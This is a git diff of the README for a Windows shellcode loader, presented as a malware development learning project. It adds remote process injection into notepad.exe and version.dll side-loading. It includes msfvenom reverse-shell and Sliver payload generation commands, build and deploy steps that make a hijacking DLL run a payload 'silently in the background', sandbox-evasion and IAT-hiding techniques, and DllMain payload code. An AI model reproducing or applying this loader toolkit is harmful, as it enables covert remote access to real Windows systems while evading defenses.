@@ -1,6 +1,6 @@
 # 🔴 Shellcode Loader
 
-A Windows shellcode loader for learning malware development fundamentals. This project demonstrates how to load and execute encrypted shellcode using Windows API functions, with sandbox evasion and IAT hiding techniques.
+A Windows shellcode loader for learning malware development fundamentals. This project demonstrates how to load and execute encrypted shellcode using Windows API functions, with sandbox evasion, IAT hiding, remote process injection, and **DLL side-loading via proxy DLL** techniques.
 
 ## 📚 Learning Roadmap Progress
 
@@ -13,6 +13,8 @@ A Windows shellcode loader for learning malware development fundamentals. This p
 | 5 | AES-256-CBC Payload Encryption | ✅ |
 | 6 | Sandbox Evasion (RAM check + cursor movement) | ✅ |
 | 7 | IAT Hiding (Dynamic API Resolution via LoadLibrary/GetProcAddress) | ✅ |
+| 8 | Remote Process Injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread) | ✅ |
+| 9 | **Proxy DLL / DLL Side-Loading (version.dll hijacking)** | ✅ |
 
 ---
 
@@ -20,12 +22,14 @@ A Windows shellcode loader for learning malware development fundamentals. This p
 
 ```
 Loader/
-├── loader.c          # Main loader (AES decrypt, sandbox evasion, IAT hiding)
+├── loader.c          # EXE loader (remote injection into notepad.exe)
+├── proxy.c           # Proxy DLL loader (version.dll side-loading)
+├── exports.def       # Export definition file (clean function names for MinGW)
 ├── aes.c             # TinyAES library (AES-256-CBC implementation)
 ├── aes.h             # TinyAES header
 ├── resource.h        # Resource ID definitions
 ├── resource.rc       # Resource script (embeds payload.bin)
-├── builder.py        # Automated build script (encrypts + compiles)
+├── builder.py        # Automated build script (encrypts + compiles EXE or DLL)
 ├── payload.bin       # Your shellcode (msfvenom/Sliver)
 └── README.md
 ```
@@ -38,14 +42,18 @@ Loader/
 
 ### Automated Build (Recommended)
 
-`builder.py` handles encryption, key generation, and compilation in one step:
+`builder.py` handles encryption, key generation, and compilation in one step. It supports two build modes: **EXE loader** and **Proxy DLL**.
 
 ```bash
-# Basic usage
+# Build EXE loader (remote injection)
 python3 builder.py payload.bin
+
+# Build proxy DLL (DLL side-loading)
+python3 builder.py payload.bin --proxy
 
 # Custom output name
 python3 builder.py payload.bin -o agent.exe
+python3 builder.py payload.bin --proxy -o custom.dll
 
 # Keep intermediate files (key.h, payload_enc.bin, resource.o)
 python3 builder.py payload.bin --keep
@@ -57,17 +65,21 @@ python3 builder.py payload.bin --keep
 3. Writes `key.h` with the key/IV as C byte arrays
 4. Updates `resource.rc` to embed the encrypted payload
 5. Compiles resource script → `resource.o`
-6. Compiles `loader.c` + `aes.c` + `resource.o` → `loader.exe`
+6. Compiles the output:
+   - **EXE mode:** `loader.c` + `aes.c` + `resource.o` → `loader.exe`
+   - **Proxy mode:** `proxy.c` + `aes.c` + `resource.o` + `exports.def` → `version.dll`
 7. Cleans up intermediate files
 
 ### Manual Compilation
 
 ```bash
-# Step 1: Compile resource script
+# EXE loader
 x86_64-w64-mingw32-windres resource.rc -o resource.o
-
-# Step 2: Compile and link (include aes.c)
 x86_64-w64-mingw32-gcc loader.c aes.c resource.o -o loader.exe -s
+
+# Proxy DLL
+x86_64-w64-mingw32-windres resource.rc -o resource.o
+x86_64-w64-mingw32-gcc proxy.c aes.c resource.o exports.def -shared -o version.dll -s
 ```
 
 > **⚠️ Manual build requires** a pre-existing `key.h` with valid `aes_key` and `aes_iv` arrays, and the payload must be AES-256-CBC encrypted with matching key/IV.
@@ -86,34 +98,117 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o payloa
 generate --mtls <IP> --save payload.bin --format shellcode
 ```
 
-### Deploy
+### Deploy — EXE Loader
 
 1. Place `payload.bin` in the Loader directory
 2. Run `python3 builder.py payload.bin`
 3. Transfer `loader.exe` to Windows target
-4. **Disable Windows Defender** (for testing)
+4. Ensure `notepad.exe` is running on the target
 5. Run the loader
+
+### Deploy — Proxy DLL (Side-Loading)
+
+1. Place `payload.bin` in the Loader directory
+2. Run `python3 builder.py payload.bin --proxy`
+3. Transfer `version.dll` to the **same folder** as a target application that loads `version.dll`
+4. Run the target application — the payload executes silently in the background
 
 ---
 
 ## 📖 Theory
 
-### Execution Flow
+### Week 9: Proxy DLL / DLL Side-Loading
+
+DLL side-loading abuses the Windows DLL search order. When an application calls `LoadLibrary("version.dll")`, Windows searches the **application's directory first** before checking `System32`. By placing a malicious `version.dll` next to the app, Windows loads ours instead.
+
+#### Why version.dll?
+
+`version.dll` is a good hijack target because:
+- Many applications load it (version info APIs are commonly used)
+- It's small with only **17 exports** — manageable to proxy
+- It's not a "known DLL" (not in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`), so the app directory is searched first
+
+#### How the Proxy Works
+
+The proxy DLL must **forward all 17 exports** to the real `version.dll` so the host application works normally. We use **runtime forwarding**:
+
+```
+Host App calls GetFileVersionInfoA()
+         │
+         ▼
+    Our version.dll (proxy)
+    ┌─────────────────────────────────────┐
+    │ 1. DllMain (DLL_PROCESS_ATTACH):    │
+    │    ├── load_real_version_dll()       │  LoadLibrary("C:\Windows\System32\version.dll")
+    │    │   └── GetProcAddress() x17      │  Resolve all real function pointers
+    │    └── CreateThread(execute_payload) │  Spawn payload in background
+    │                                      │
+    │ 2. GetFileVersionInfoA() wrapper:    │
+    │    └── p_GetFileVersionInfoA(...)    │  Forward call to real version.dll
+    └─────────────────────────────────────┘
+         │
+         ▼
+    Real version.dll (System32)
+    └── Actual GetFileVersionInfoA()
+```
+
+#### Runtime Forwarding vs. Linker Forwarding
+
+| Approach | How | MinGW Compatible? |
+|----------|-----|:---:|
+| `#pragma comment(linker, "/export:...")` | MSVC linker directive | ❌ |
+| `.def` file with `EXPORTS FuncName = other.FuncName` | Linker-level forwarding | ⚠️ Unreliable |
+| **LoadLibrary + GetProcAddress** | Runtime resolution | ✅ |
+
+We use **runtime forwarding** because it works reliably with MinGW/GCC cross-compilation from Kali.
+
+#### exports.def — Clean Export Names
+
+MinGW's `stdcall` calling convention can add `@N` suffixes to exported function names (e.g., `GetFileVersionInfoA@16`). The host app expects clean names, so `exports.def` ensures undecorated exports:
+
+```def
+LIBRARY version
+EXPORTS
+    GetFileVersionInfoA
+    GetFileVersionInfoW
+    ...
+    VerQueryValueW
+```
+
+#### DllMain — Thread-Based Payload Execution
+
+`DllMain` runs under the **loader lock**, so calling complex APIs (memory allocation, decryption, shellcode execution) directly would **deadlock**. The solution is to spawn a new thread:
+
+```c
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            load_real_version_dll();                                    // Forward exports
+            CreateThread(NULL, 0, execute_payload, (LPVOID)hinstDLL, 0, NULL);  // Payload
+            break;
+        case DLL_PROCESS_DETACH:
+            if (hRealVersion) FreeLibrary(hRealVersion);               // Cleanup
+            break;
+    }
+    return TRUE;
+}
+```
+
+The DLL module handle (`hinstDLL`) is passed to the thread so `FindResource` loads the payload from **our DLL**, not the host EXE.
+
+#### Payload Execution Flow (proxy.c)
 
 ```
 ┌──────────────────────────────────────────────────────┐
 │ 1. is_sandbox()                                      │  Sandbox evasion checks
 │    ├── RAM < 4GB? → exit                             │
 │    └── Cursor not moving? → exit                     │
-│ 2. LoadLibrary("kernel32.dll")                       │  Dynamic API resolution
-│    └── GetProcAddress("VirtualAlloc")                │  (hides from IAT)
-│ 3. FindResource() → LoadResource() → LockResource() │  Load encrypted payload
-│ 4. pVirtualAlloc(PAGE_READWRITE)                     │  Allocate RW memory
-│ 5. RtlMoveMemory()                                  │  Copy encrypted shellcode
-│ 6. AES_CBC_decrypt_buffer()                          │  Decrypt in memory
-│ 7. VirtualProtect(PAGE_EXECUTE_READ)                 │  Flip to RX
-│ 8. CreateThread()                                    │  Execute in new thread
-│ 9. WaitForSingleObject()                             │  Wait for shell
+│ 2. FindResource(hSelf) → LoadResource → LockResource │  Load from THIS DLL
+│ 3. VirtualAlloc(PAGE_READWRITE)                      │  Allocate RW memory
+│ 4. RtlMoveMemory()                                  │  Copy encrypted shellcode
+│ 5. AES_CBC_decrypt_buffer()                          │  Decrypt in memory
+│ 6. VirtualProtect(PAGE_EXECUTE_READ)                 │  Flip RW → RX
+│ 7. ((void(*)())exec_buf)()                           │  Execute shellcode directly
 └──────────────────────────────────────────────────────┘
 ```
 
